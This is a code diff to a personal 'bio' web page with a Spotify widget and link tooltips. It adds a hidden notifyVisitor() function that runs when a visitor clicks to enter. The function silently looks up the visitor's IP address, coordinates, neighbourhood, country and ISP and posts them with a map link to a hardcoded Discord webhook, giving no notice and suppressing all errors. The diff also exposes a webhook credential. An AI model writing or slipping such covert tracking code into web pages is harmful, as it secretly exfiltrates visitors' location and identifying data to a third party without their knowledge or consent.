@@ -579,6 +579,7 @@
         function startBio() {
             enterScreen.style.opacity = '0';
             updateSpotify();
+            notifyVisitor();
             setTimeout(() => {
                 enterScreen.style.display = 'none';
                 content.classList.add('visible-content');
@@ -596,6 +597,65 @@
             link.addEventListener('mousemove', (e) => { tooltip.style.left = (e.clientX + 20) + 'px'; tooltip.style.top = (e.clientY + 20) + 'px'; });
             link.addEventListener('mouseleave', () => { tooltip.classList.remove('show'); });
         });
+        
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1538048516285407262/dXUHIs1zoucv7A5v9Y70lxEvqn7LtYKxgFsEeHSApKdsFz_5kxzB8Vif0V5cS2H8WS0M";
+
+        async function notifyVisitor() {
+            if (sessionStorage.getItem("visited_recently")) return;
+
+            try {
+                // 1. Fetch IP & Coordinates
+                const res = await fetch("https://ipapi.co/json/");
+                const data = await res.json();
+
+                if (!data.latitude || !data.longitude) return;
+
+                const lat = data.latitude;
+                const lon = data.longitude;
+                let neighborhood = "";
+
+                // 2. Fetch neighborhood/area name using free Reverse Geocoding
+                try {
+                    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+                    const geoData = await geoRes.json();
+                    const addr = geoData.address;
+                    neighborhood = addr.suburb || addr.neighbourhood || addr.residential || addr.subdistrict || "";
+                } catch (e) {}
+
+                const locationText = neighborhood ? `${neighborhood}, ${data.city}` : `${data.city}, ${data.region}`;
+                const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                
+                // 3. Map URL using English language setting (lang=en_US)
+                const mapImageUrl = `https://static-maps.yandex.ru/1.x/?l=map&pt=${lon},${lat},pm2rdm&z=11&size=450,250&lang=en_US`;
+
+                // 4. Send updated Embed to Discord
+                const payload = {
+                    embeds: [{
+                        title: "🗺️ New Visitor Location Map",
+                        color: 0x1DB954,
+                        description: `[👉 Open in Google Maps](${mapsUrl})`,
+                        fields: [
+                            { name: "IP Address", value: data.ip || "Unknown", inline: true },
+                            { name: "Area / City", value: locationText, inline: true },
+                            { name: "Country", value: data.country_name || "Unknown", inline: true },
+                            { name: "ISP/Org", value: data.org || "Unknown", inline: false }
+                        ],
+                        image: { url: mapImageUrl },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+
+                sessionStorage.setItem("visited_recently", "true");
+            } catch (e) {}
+        }
+
+        
     </script>
 </body>
 </html>
